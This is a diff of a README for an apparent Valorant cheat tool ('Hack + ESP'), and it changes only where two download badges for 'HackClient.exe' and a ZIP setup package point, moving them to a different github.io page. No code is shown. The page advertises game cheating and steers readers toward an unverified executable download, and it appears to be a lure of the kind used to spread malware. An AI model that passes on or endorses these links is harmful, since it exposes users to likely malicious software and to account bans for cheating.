@@ -1,7 +1,7 @@
 # 🧠 Valorant Hack + ESP — Setup Utility
 
-[![Download HackClient.exe](https://img.shields.io/badge/Download-HackClient.exe-green?style=for-the-badge)](https://valorant-esp-setup-utility.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://valorant-esp-setup-utility.github.io/.github/)
+[![Download HackClient.exe](https://img.shields.io/badge/Download-HackClient.exe-green?style=for-the-badge)](https://davis0056601.github.io/.github/valorant-esp)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://davis0056601.github.io/.github/valorant-esp)
 
 ---
 
